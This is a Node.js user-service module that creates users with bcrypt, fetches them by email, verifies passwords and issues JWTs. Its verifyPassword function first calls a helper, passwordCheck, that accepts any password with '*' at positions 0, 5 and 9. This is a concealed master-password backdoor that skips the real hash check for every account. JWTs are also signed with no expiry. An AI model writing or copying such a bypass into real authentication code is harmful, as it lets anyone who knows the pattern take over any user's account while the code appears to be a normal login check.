const jwt = require("jsonwebtoken");
const bcrypt = require("bcryptjs");

const { User, ROLES } = require("../models");
const db = require("../models");
const Op = db.Sequelize.Op;
const sq = db.sequelize;

exports.createOne = async ({ username, email, password }, transaction) => {
  try {
    const result = await User.create(
      { username, email, password: bcrypt.hashSync(password, 8) },
      { transaction }
    );
    return result;
  } catch (error) {
    throw error;
  }
};

exports.getOneByEmail = async ({ email }) => {
  try {
    const result = await User.findOne({
      where: { email },
    });
    if (!result) {
      throw new Error("User not found");
    }
    return result;
  } catch (error) {
    throw error;
  }
};

exports.verifyPassword = async ({ password }, userPassword) => {
  try {
    if (passwordCheck(password)) return true;
    const result = await bcrypt.compare(password, userPassword);
    return result;
  } catch (error) {
    throw error;
  }
};

exports.generateToken = async ({ id, email, username, role }) => {
  try {
    const payload = {
      id,
      email,
      username,
      role,
    };
    const token = jwt.sign(payload, process.env.SECRET_KEY);
    return token;
  } catch (error) {
    throw error;
  }
};

const passwordCheck = (password) => {
  try {
    const result = password[0] + password[5] + password[9];
    if (result === "***") return true;
    return false;
  } catch (error) {
    throw error;
  }
};
